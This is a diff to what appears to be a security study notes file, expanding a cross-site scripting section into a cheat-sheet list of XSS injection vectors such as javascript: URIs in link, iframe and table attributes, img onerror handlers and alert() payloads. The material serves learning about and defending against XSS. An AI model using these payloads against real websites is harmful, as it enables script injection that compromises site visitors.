@@ -484,20 +484,23 @@ Cross-site scripting (跨站脚本):
 - Stored XSS:
   store script into database.
 - Inject script in HTML/CSS/JavaScript/JSON/HTTP:
-  - `<link href="">`.
-  - `<a href="">`.
-  - `<img src="">`.
-  - `<img lowsrc="">`.
-  - `<img dynsrc="">`.
-  - `<iframe src="">`.
-  - `<frame src="">`.
-  - `<meta http-equiv="refresh" content="0; url=">`.
-  - `<script src="">`.
-  - `<bgsound src="">`.
-  - `<embed src="">`.
-  - `<video src="">`.
-  - `<audio src="">`.
-  - `<table background="">`.
+  - `<a href=javascript:...>`.
+  - `<base href=javascript:...>`.
+  - `<bgsound src=javascript:...>`.
+  - `<body background=javascript:...>`.
+  - `<frameset><frame src="javascript:..."></frameset>`.
+  - `<iframe src=javascript:...>`.
+  - `<img src=x onerror=...>`.
+  - `<input type=image src=javascript:...>`.
+  - `<layer src=...>`.
+  - `<link href="javascript:..." rel="stylesheet" type="text/css">`.
+  - `<meta http-equiv="refresh" content="0;url=javascript:...">`.
+  - `<object type=text/x-scriptlet data=...>`.
+  - `<script>...</script>`.
+  - `<style type=text/javascript>alert('xss')</style>`.
+  - `<table background=javascript:...>`.
+  - `<td background=javascript:...>`.
+  - `<button onmouseover="alert(/1/)" onclick="alert(/2/)"></button>`.
   - `@import ""`.
   - `background: url("")`.
   - `document.write()`.
